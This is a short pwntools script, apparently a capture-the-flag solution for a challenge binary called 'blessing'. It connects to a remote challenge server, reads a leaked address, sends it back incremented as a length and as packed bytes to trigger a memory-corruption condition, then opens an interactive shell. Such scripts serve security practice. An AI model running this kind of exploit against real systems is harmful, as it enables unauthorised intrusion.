from pwn import *
from fmtstr import FormatString
#p = process("./blessing")
#p = gdb.debug("./blessing","break *main+348")
p = remote("94.237.53.247",52907)
context.log_level = "debug"

p.recvuntil("Please accept this: ")

key = (p.recv())
key = int(key.decode(),16)
key = key + 1
success(hex(key))

p.sendlineafter("Give me the song's length: ",str(key))

p.sendafter("Excellent! Now tell me the song: ",p64(key))

p.interactive() 